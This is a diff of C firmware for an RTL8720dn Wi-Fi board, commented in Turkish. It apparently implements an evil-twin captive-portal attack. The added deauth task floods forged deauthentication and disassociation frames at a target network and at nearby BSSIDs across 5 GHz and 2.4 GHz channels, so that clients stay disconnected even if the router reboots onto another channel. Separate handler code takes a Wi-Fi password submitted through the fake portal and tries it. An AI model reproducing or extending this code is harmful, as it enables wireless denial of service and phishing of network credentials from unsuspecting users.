@@ -1,5 +1,5 @@
 // AP+STA Captive Portal — RTL8720dn (AmebaD)
-// NİHAİ SÜRÜM: Max TX/RX Gücü + Multi-Frame Burst Deauth + Dinamik Arayüz
+// NİHAİ SÜRÜM: Modem Reboot (Kanal Kaçırma) Korumalı + Geniş Alan Burst Deauth
 
 #include "sys_api.h"  
 #include "WiFi.h"
@@ -43,8 +43,6 @@ extern "C" {
   void LwIP_Init(void);
   int  wext_send_mgnt(const char *ifname, char *buf, uint16_t buf_len, uint16_t flags);
   int  wifi_set_channel(int channel); 
-  
-  // YENİ: MAKSİMUM GÜÇ (Power Save İptali) KOMUTU
   int  wifi_disable_powersave(void);
 }
 
@@ -436,17 +434,26 @@ void startConnectTask() {
   xTaskCreate(wifiConnectTask, "wconn", 8192, NULL, tskIDLE_PRIORITY + 2, NULL);
 }
 
-// ─── DEAUTH GÖREVİ (MULTI-FRAME BURST) ───────────────────────────────────────
+// ─── YENİ: MODEM REBOOT (KANAL KAÇIRMA) KORUMALI DEAUTH GÖREVİ ───────────────
 void deauthTask(void *param) {
   (void)param;
+  
   uint8_t frame_template[26] = {
     0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
     0x00, 0x00, 0x07, 0x00 
   };
+  
   int common_5g_channels[] = {36, 40, 44, 48, 149};
+  
+  // YENİ: Modem kendini yeniden başlatıp başka kanala kaçarsa diye genel tarama kanalları
+  int common_24g_channels[] = {1, 6, 11};
+
+  Serial.println("\n[Deauth] Anti-Kacis (Geniş Alan BSSID Fuzzing) Aktif!");
 
   while (deauth_active) {
+    
+    // === 1. HEDEFİN ANA KANALINA ATIŞ (Birincil Öncelik) ===
     wifi_set_channel(target_channel);
     for (int offset = -2; offset <= 2; offset++) {
         uint8_t temp_bssid[6];
@@ -464,10 +471,35 @@ void deauthTask(void *param) {
         vTaskDelay(pdMS_TO_TICKS(1)); 
     }
     
+    // Ağın Çökmemesi İçin Nefes Alma (150ms)
     vTaskDelay(pdMS_TO_TICKS(150)); 
 
+    // === 2. 5GHz KANALLARINA BASKIN ===
     for(int c=0; c < 5; c++) {
         wifi_set_channel(common_5g_channels[c]);
+        for (int offset = -2; offset <= 2; offset++) {
+            uint8_t temp_bssid[6];
+            memcpy(temp_bssid, target_bssid, 6);
+            temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);
+            memcpy(&frame_template[10], temp_bssid, 6);
+            memcpy(&frame_template[16], temp_bssid, 6);
+
+            frame_template[0] = 0xC0; frame_template[24] = 0x07;
+            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+            frame_template[24] = 0x02;
+            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+            frame_template[0] = 0xA0; frame_template[24] = 0x08;
+            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+            vTaskDelay(pdMS_TO_TICKS(1)); 
+        }
+    }
+    
+    // === 3. YENİ: MODEM REBOOT OLURSA DİYE 2.4GHz GÜVENLİK AĞI (Kaçış İmkansız) ===
+    for(int c=0; c < 3; c++) {
+        // Eğer bu kanal zaten hedef kanalsa tekrar vurmaya gerek yok
+        if(common_24g_channels[c] == target_channel) continue; 
+        
+        wifi_set_channel(common_24g_channels[c]);
         for (int offset = -2; offset <= 2; offset++) {
             uint8_t temp_bssid[6];
             memcpy(temp_bssid, target_bssid, 6);
@@ -540,7 +572,6 @@ void sendChunkedCSS(WiFiClient &client) {
   }
 }
 
-// OFFLINE KORUYUCU JS
 void sendOfflineScript(WiFiClient &client) {
   client.print("<div id='offline-bar'>&#9888; Bağlantı zayıf, lütfen sayfayı kapatmadan bekleyiniz...</div>");
   client.print("<script>");
@@ -759,7 +790,6 @@ void handleClient(WiFiClient &client) {
     if (conn_status == CS_RUNNING) { sendPortalPage(client, false); return; }
     String sel_pass = parsePostParam(body, "pass");
     
-    // ŞİFRE DENENİRKEN ÇİP KİLİTLENMESİN DİYE DEAUTH DURDURULUR!
     deauth_active = false; 
     delay(300); 
 
@@ -793,9 +823,7 @@ void setup() {
   LwIP_Init();
   wifi_on(RTW_MODE_STA_AP); delay(500);
 
-  // MAKSİMUM GÜÇ (Power Save İptali)
   wifi_disable_powersave();
-  Serial.println("[Güc] Power Save IPTAL! Cihaz Maksimum TX/RX Gucunde Calisiyor.");
 
   wifi_start_ap((char *)AP_INITIAL_SSID, RTW_SECURITY_WPA2_AES_PSK, (char *)AP_INITIAL_PASS, strlen(AP_INITIAL_SSID), strlen(AP_INITIAL_PASS), 6);
   delay(500);
